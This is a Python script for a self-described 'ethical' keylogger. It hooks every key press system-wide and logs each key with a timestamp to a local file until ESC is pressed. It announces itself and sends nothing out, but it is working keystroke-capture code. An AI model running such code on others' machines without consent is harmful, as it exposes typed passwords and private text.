import keyboard
from datetime import datetime
import sys

class EthicalKeylogger:
    def __init__(self, log_file="keystrokes.log"):
        self.log_file = log_file
        self.running = False
        self.start_time = None
        self.setup_log_file()

    def setup_log_file(self):
        """Initialize the log file with a header."""
        header = f"\n\n=== KEYLOGGER SESSION STARTED AT {datetime.now()} ===\n"
        with open(self.log_file, "a") as f:
            f.write(header)

    def on_key_event(self, event):
        """Callback for key events"""
        if event.event_type == "down":  # Only log key down events
            try:
                with open(self.log_file, "a") as f:
                    log_entry = f"[{datetime.now()}] {event.name}\n"
                    f.write(log_entry)
            except Exception as e:
                print(f"Error Logging Key: {e}")

    def start(self):
        """Start the keylogger."""
        if self.running:
            return
        print(f"Keylogger started... Logging to {self.log_file}")
        self.running = True
        self.start_time = datetime.now()

        keyboard.hook(self.on_key_event)
        keyboard.wait('esc')  # Wait until ESC is pressed
        self.stop()

    def stop(self):
        """Stop the keylogger gracefully"""
        if not self.running:
            return
        self.running = False
        keyboard.unhook_all()

        duration = datetime.now() - self.start_time
        summary = f"\n=== Session Duration: {duration} ===\n"
        with open(self.log_file, "a") as f:
            f.write(summary)
        print(f"\nKeylogger stopped. Log saved to {self.log_file}")

if __name__ == "__main__":
    try:
        print("Ethical Keylogger Initialized. Press ESC to stop.")
        logger = EthicalKeylogger()
        logger.start()
    except KeyboardInterrupt:
        logger.stop()
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)
                             
